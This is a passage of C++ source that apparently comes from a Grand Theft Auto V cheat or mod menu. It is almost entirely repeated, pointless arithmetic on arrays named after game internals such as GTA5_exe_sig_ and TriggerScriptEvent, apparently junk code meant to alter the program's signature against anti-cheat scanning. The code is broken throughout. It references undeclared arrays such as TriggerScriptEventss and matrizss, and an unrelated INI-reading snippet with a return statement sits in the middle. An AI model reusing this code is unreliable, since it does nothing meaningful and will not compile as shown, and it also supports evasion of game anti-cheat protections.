				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				char buf[100];
				GetPrivateProfileStringA(app.c_str(), key.c_str(), "NULL", buf, 100, INIFilePath.c_str());
				return (std::string)buf;
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
